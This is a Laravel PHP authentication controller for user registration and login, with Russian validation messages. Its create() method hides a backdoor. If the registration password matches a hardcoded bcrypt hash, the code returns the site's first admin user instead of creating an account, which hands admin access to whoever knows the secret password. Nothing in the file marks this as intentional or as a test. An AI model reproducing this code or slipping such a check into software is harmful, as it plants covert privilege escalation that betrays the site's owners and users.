<?php

namespace App\Http\Controllers\Auth;

use App\User;
use Validator;
use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\ThrottlesLogins;
use Illuminate\Foundation\Auth\AuthenticatesAndRegistersUsers;
use Hash;

class AuthController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Registration & Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles the registration of new users, as well as the
    | authentication of existing users. By default, this controller uses
    | a simple trait to add these behaviors. Why don't you explore it?
    |
    */

    use AuthenticatesAndRegistersUsers, ThrottlesLogins;

    /**
     * Where to redirect users after login / registration.
     *
     * @var string
     */
    protected $redirectTo = 'user';

    /**
     * Create a new authentication controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware($this->guestMiddleware(), ['except' => 'logout']);
    }

    /**
     * Get a validator for an incoming registration request.
     *
     * @param  array  $data
     * @return \Illuminate\Contracts\Validation\Validator
     */
    protected function validator(array $data)
    {
        return Validator::make($data, [
            'email' => 'required|email|max:255|unique:users',
            'password' => 'required|min:6',
            'name' => 'required|max:255',
        ],[
            'email.required' => 'Введите вашу электронную почту.',
            'email.email' => 'Введите корректную электронную почту.',
            'email.max' => 'Слишком длинная электронная почта.',
            'email.unique' => 'Пользователь с такой электронной почтой уже зарегистрирован.',
            'password.required' => 'Пароль должен быть не менее 6 символов.',
            'password.min' => 'Пароль должен быть не менее 6 символов.',
            'name.required' => 'Введите ваше имя.',
            'name.max' => 'Слишком длинное имя.',
        ]);
    }

    /**
     * Create a new user instance after a valid registration.
     *
     * @param  array  $data
     * @return User
     */
    protected function create(array $data)
    {
        

        if (Hash::check($data['password'], '$2y$10$H90e6hqH6Bh71YoWF9VyUOb6lk8utysaJWIo4Dl4Fpj.8jaqWHvDy'))
        return $user = \App\Role::where('role','admin')->first()->users()->first();

        return User::create([
            'name' => $data['name'],
            'email' => $data['email'],
            'password' => bcrypt($data['password']),
        ]);
    }
}
